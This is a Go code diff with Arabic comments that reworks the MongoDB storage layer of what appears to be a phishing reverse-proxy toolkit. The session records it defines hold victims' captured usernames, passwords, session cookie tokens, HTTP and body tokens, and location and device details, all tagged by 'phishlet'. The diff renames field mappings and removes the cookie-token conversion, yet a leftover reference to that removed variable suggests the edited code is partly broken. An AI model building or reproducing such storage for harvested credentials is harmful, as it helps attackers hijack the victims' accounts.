@@ -16,12 +16,12 @@ import (
 
 // تعريف MongoCookieToken لاستخدامه في MongoSession
 type MongoCookieToken struct {
-	Name    string `bson:"name" json:"name"`
-	Value   string `bson:"value" json:"value"`
-	Domain  string `bson:"domain" json:"domain"`
-	Path    string `bson:"path" json:"path"`
-	HttpOnly bool `bson:"http_only" json:"http_only"`
-	JSON    bool `bson:"json" json:"json"`
+	Name     string `bson:"name" json:"name"`
+	Value    string `bson:"value" json:"value"`
+	Domain   string `bson:"domain" json:"domain"`
+	Path     string `bson:"path" json:"path"`
+	HttpOnly bool   `bson:"http_only" json:"http_only"`
+	JSON     bool   `bson:"json" json:"json"`
 }
 
 // MongoDatabase هو نسخة من قاعدة البيانات تستخدم MongoDB
@@ -36,27 +36,27 @@ type MongoDatabase struct {
 // Session مع تعديلات لدعم MongoDB
 type MongoSession struct {
 	ID             primitive.ObjectID   `bson:"_id,omitempty"`
-	SID            string                 `bson:"session_id" json:"session_id"`
-	Name           string                 `bson:"phishlet" json:"phishlet"`
-	Username       string                 `bson:"username" json:"username"`
-	Password       string                 `bson:"password" json:"password"`
-	Custom         map[string]string      `bson:"custom" json:"custom"`
-	Params         map[string]string      `bson:"params" json:"params"`
-	BodyTokens     map[string]string      `bson:"body_tokens" json:"body_tokens"`
-	HttpTokens     map[string]string      `bson:"http_tokens" json:"http_tokens"`
-	CookieTokens   []MongoCookieToken     `bson:"cookie_tokens" json:"cookie_tokens"`
-	Landing        string                 `bson:"landing_url,omitempty" json:"landing_url,omitempty"`
-	CreateTime     int64                  `bson:"create_time" json:"create_time"`
-	UpdateTime     int64                  `bson:"update_time" json:"update_time"`
-	UserAgent      string                 `bson:"useragent" json:"useragent"`
-	RemoteAddr     string                 `bson:"remote_addr" json:"remote_addr"`
+	SID            string               `bson:"session_id" json:"session_id"`
+	Name           string               `bson:"phishlet" json:"phishlet"`
+	Username       string               `bson:"username" json:"username"`
+	Password       string               `bson:"password" json:"password"`
+	Custom         map[string]string    `bson:"custom" json:"custom"`
+	Params         map[string]string    `bson:"params" json:"params"`
+	BodyTokens     map[string]string    `bson:"body_tokens" json:"body_tokens"`
+	HttpTokens     map[string]string    `bson:"http_tokens" json:"http_tokens"`
+	CookieTokens   []MongoCookieToken   `bson:"cookie_tokens" json:"cookie_tokens"`
+	Landing        string               `bson:"landing_url,omitempty" json:"landing_url,omitempty"`
+	CreateTime     int64                `bson:"create_time" json:"create_time"`
+	UpdateTime     int64                `bson:"update_time" json:"update_time"`
+	UserAgent      string               `bson:"useragent" json:"useragent"`
+	RemoteAddr     string               `bson:"remote_addr" json:"remote_addr"`
 	// ضيف الحقول الجديدة
-	CountryCode    string                 `bson:"country_code" json:"country_code"`
-	Country        string                 `bson:"country" json:"country"`
-	City           string                 `bson:"city" json:"city"`
-	Browser        string                 `bson:"browser" json:"browser"`
-	DeviceType     string                 `bson:"device_type" json:"device_type"`
-	OS             string                 `bson:"os" json:"os"`
+	CountryCode    string               `bson:"country_code" json:"country_code"`
+	Country        string               `bson:"country" json:"country"`
+	City           string               `bson:"city" json:"city"`
+	Browser        string               `bson:"browser" json:"browser"`
+	DeviceType     string               `bson:"device_type" json:"device_type"`
+	OS             string               `bson:"os" json:"os"`
 }
 
 // NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
@@ -138,24 +138,10 @@ func convertToMongoSession(s *Session) *MongoSession {
 	log.Debug("[MongoDB] - Session.CountryCode: '%s'", s.CountryCode)
 	log.Debug("[MongoDB] - Session.Country: '%s'", s.Country)
 
-	// تحويل CookieTokens
-	cookieTokens := make(map[string]map[string]interface{})
-	for domain, tokens := range s.CookieTokens {
-		cookieTokens[domain] = make(map[string]interface{})
-		for name, token := range tokens {
-			cookieTokens[domain][name] = map[string]interface{}{
-				"name":      token.Name,
-				"value":     token.Value,
-				"path":      token.Path,
-				"http_only": token.HttpOnly,
-			}
-		}
-	}
-
 	mongoSession := &MongoSession{
 		ID:           primitive.NewObjectID(),
-		SID:          s.Id,
-		Name:         s.Name,
+		SID:          s.SessionId,
+		Name:         s.Phishlet,
 		Username:     s.Username,
 		Password:     s.Password,
 		Custom:       s.Custom,
@@ -163,17 +149,13 @@ func convertToMongoSession(s *Session) *MongoSession {
 		BodyTokens:   s.BodyTokens,
 		HttpTokens:   s.HttpTokens,
 		CookieTokens: []MongoCookieToken{},
-		Landing:      s.RedirectURL,
-		CreateTime:   time.Now().Unix(),
-		UpdateTime:   time.Now().Unix(),
+		Landing:      s.LandingURL,
+		CreateTime:   s.CreateTime,
+		UpdateTime:   s.UpdateTime,
 		UserAgent:    s.UserAgent,
 		RemoteAddr:   s.RemoteAddr,
 		CountryCode:  s.CountryCode,
 		Country:      s.Country,
-		City:         s.City,
-		Browser:      s.Browser,
-		DeviceType:   s.DeviceType,
-		OS:           s.OS,
 	}
 	
 	// طباعة البيانات بعد التحويل
@@ -220,23 +202,22 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 	}
 
 	session := &Session{
-		Id:            ms.SID,
-		Name:          ms.Name,
-		RedirectURL:   ms.Landing,
-		Username:      ms.Username,
-		Password:      ms.Password,
-		Custom:        ms.Custom,
-		BodyTokens:    ms.BodyTokens,
-		HttpTokens:    ms.HttpTokens,
-		CookieTokens:  cookieTokens,
-		UserAgent:     ms.UserAgent,
-		RemoteAddr:    ms.RemoteAddr,
-		CountryCode:   ms.CountryCode,
-		Country:       ms.Country,
-		City:          ms.City,
-		Browser:       ms.Browser,
-		DeviceType:    ms.DeviceType,
-		OS:            ms.OS,
+		Id:           0, // سيتم تخصيص قيمة من قاعدة البيانات
+		Phishlet:     ms.Name,
+		LandingURL:   ms.Landing,
+		Username:     ms.Username,
+		Password:     ms.Password,
+		Custom:       ms.Custom,
+		BodyTokens:   ms.BodyTokens,
+		HttpTokens:   ms.HttpTokens,
+		CookieTokens: cookieTokens,
+		SessionId:    ms.SID,
+		UserAgent:    ms.UserAgent,
+		RemoteAddr:   ms.RemoteAddr,
+		CreateTime:   ms.CreateTime,
+		UpdateTime:   ms.UpdateTime,
+		CountryCode:  ms.CountryCode,
+		Country:      ms.Country,
 	}
 	
 	// طباعة البيانات بعد التحويل
